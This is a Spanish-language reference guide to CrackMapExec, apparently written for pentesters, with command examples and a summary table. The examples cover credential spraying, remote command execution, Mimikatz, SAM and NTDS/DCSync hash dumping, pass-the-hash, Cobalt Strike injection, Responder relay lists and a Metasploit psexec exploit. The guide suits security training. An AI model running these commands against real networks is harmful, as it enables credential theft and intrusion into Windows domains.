

CrackMapExec (CME) es una herramienta de post-explotación y enumeración para entornos de Active Directory y SMB. Es muy utilizada por pentesters y red teamers para ejecutar ataques basados en credenciales, listar usuarios y equipos, ejecutar comandos de manera remota y realizar enumeraciones detalladas en redes Windows. CME combina múltiples funcionalidades en una única herramienta, facilitando la administración y explotación de redes Windows.

## Funcionalidades de CrackMapExec

### 1. Enumeración de Información

- **Enumeración de Usuarios y Grupos**:
  - Listar todos los usuarios y grupos en un dominio.
  - **Ejemplo**: Enumerar todos los usuarios del dominio:

    ```bash
    crackmapexec smb <IP> -u <usuario> -p <password> --users
    ```

- **Enumeración de Máquinas**:
  - Identificar todas las máquinas y sistemas operativos en la red.
  - **Ejemplo**: Enumerar todas las máquinas en una subred:

    ```bash
    crackmapexec smb <RANGO_IP> --shares
    ```

- **Enumeración de Recursos Compartidos (Shares)**:
  - Listar todos los recursos compartidos (shares) en la red.
  - **Ejemplo**: Listar todos los recursos compartidos en una máquina específica:

    ```bash
    crackmapexec smb <IP> --shares
    ```

### 2. Validación de Credenciales

- **Comprobación de Credenciales**:
  - Verificar la validez de credenciales en múltiples máquinas dentro de un dominio.
  - **Ejemplo**: Probar una lista de usuarios y contraseñas contra una IP o rango de IPs:

    ```bash
    crackmapexec smb <RANGO_IP> -u users.txt -p passwords.txt
    ```

### 3. Ejecución Remota de Comandos

- **Ejecución de Comandos (PSExec)**:
  - Ejecutar comandos remotos utilizando métodos como PSExec, WMI, o SMB.
  - **Ejemplo**: Ejecutar un comando en una máquina remota usando PSExec:

    ```bash
    crackmapexec smb <IP> -u <usuario> -p <password> -x 'ipconfig /all'
    ```

- **Ejecución de Scripts y Binarios (Mimikatz)**:
  - Ejecutar scripts o binarios como Mimikatz en máquinas comprometidas.
  - **Ejemplo**: Ejecutar Mimikatz en un sistema remoto para obtener hashes de contraseñas:

    ```bash
    crackmapexec smb <IP> -u <usuario> -p <password> -M mimikatz
    ```

### 4. Dumping de Hashes y Credenciales

- **Extracción de Hashes SAM y LSA**:
  - Dumping de hashes SAM y LSA para obtener credenciales del sistema.
  - **Ejemplo**: Extraer hashes de la SAM de una máquina comprometida:

    ```bash
    crackmapexec smb <IP> -u <usuario> -p <password> --sam
    ```

- **Dumping de Credenciales de Active Directory**:
  - Dumping de credenciales de AD usando `DCSync`.
  - **Ejemplo**: Utilizar DCSync para obtener las credenciales de todos los usuarios de un dominio:

    ```bash
    crackmapexec smb <IP_DC> -u <usuario> -p <password> --ntds
    ```

### 5. Pivoting y Movimiento Lateral

- **Pass-the-Hash y Pass-the-Ticket**:
  - Realizar ataques Pass-the-Hash y Pass-the-Ticket para moverse lateralmente dentro del dominio.
  - **Ejemplo**: Utilizar un hash NTLM para autenticarse en una máquina:

    ```bash
    crackmapexec smb <IP> -u <usuario> -H <hash>
    ```

- **Lanzar Agentes de Cobalt Strike**:
  - Lanzar agentes de Cobalt Strike en máquinas comprometidas.
  - **Ejemplo**: Inyectar un agente de Cobalt Strike en memoria:

    ```bash
    crackmapexec smb <IP> -u <usuario> -p <password> -M cs
    ```

### 6. Combinación con Otras Herramientas

- **Mimikatz**:
  - CME permite ejecutar Mimikatz directamente en máquinas remotas para extraer credenciales.
  - **Ejemplo**: Ejecutar Mimikatz y extraer todos los hashes:

    ```bash
    crackmapexec smb <IP> -u <usuario> -p <password> -M mimikatz
    ```

- **Responder**:
  - CME puede combinarse con Responder para realizar ataques de envenenamiento de LLMNR y NBNS.
  - **Ejemplo**: Capturar credenciales con Responder mientras CME realiza consultas en la red.

    ```bash
    crackmapexec smb <RANGO_IP> --no-bruteforce --gen-relay-list targets.txt
    responder -I eth0 -r -d -w
    ```

- **Metasploit**:
  - CME se puede usar para lanzar exploits de Metasploit en máquinas comprometidas.
  - **Ejemplo**: Lanzar un exploit en una máquina remota desde Metasploit:

    ```bash
    use exploit/windows/smb/psexec
    set SMBUser <usuario>
    set SMBPass <password>
    set RHOST <IP>
    exploit
    ```

## Resumen de Comandos de CrackMapExec

| Funcionalidad                          | Comando                                                                                          | Descripción                                                                                  |
|----------------------------------------|-------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------|
| **Enumeración de Usuarios**            | `crackmapexec smb <IP> -u <usuario> -p <password> --users`                                      | Enumera todos los usuarios del dominio.                                                      |
| **Enumeración de Máquinas**            | `crackmapexec smb <RANGO_IP> --shares`                                                          | Enumera todas las máquinas en una subred y sus recursos compartidos.                         |
| **Enumeración de Shares**              | `crackmapexec smb <IP> --shares`                                                                | Lista todos los recursos compartidos en una máquina específica.                              |
| **Validación de Credenciales**         | `crackmapexec smb <RANGO_IP> -u users.txt -p passwords.txt`                                      | Verifica una lista de usuarios y contraseñas en múltiples máquinas.                          |
| **Ejecución de Comandos Remotos**      | `crackmapexec smb <IP> -u <usuario> -p <password> -x 'ipconfig /all'`                            | Ejecuta un comando remoto en una máquina usando PSExec.                                      |
| **Ejecución de Mimikatz**              | `crackmapexec smb <IP> -u <usuario> -p <password> -M mimikatz`                                   | Ejecuta Mimikatz para obtener credenciales.                                                  |
| **Dumping de Hashes SAM**              | `crackmapexec smb <IP> -u <usuario> -p <password> --sam`                                        | Extrae hashes SAM de una máquina comprometida.                                               |
| **Dumping de Credenciales AD (DCSync)**| `crackmapexec smb <IP_DC> -u <usuario> -p <password> --ntds`                                     | Extrae credenciales de Active Directory usando DCSync.                                       |
| **Pass-the-Hash**                      | `crackmapexec smb <IP> -u <usuario> -H <hash>`                                                  | Utiliza un hash NTLM para autenticarse en una máquina.                                       |
| **Inyección de Cobalt Strike**         | `crackmapexec smb <IP> -u <usuario> -p <password> -M cs`                                        | Inyecta un agente de Cobalt Strike en memoria de una máquina remota.                         |
| **Combinación con Responder**          | `crackmapexec smb <RANGO_IP> --no-bruteforce --gen-relay-list targets.txt`                      | Genera una lista de objetivos para realizar ataques de envenenamiento con Responder.         |
| **Integración con Metasploit**         | `use exploit/windows/smb/psexec; set SMBUser <usuario>; set SMBPass <password>; set RHOST <IP>` | Ejecuta un exploit en Metasploit para comprometer una máquina remota usando PSExec.          |
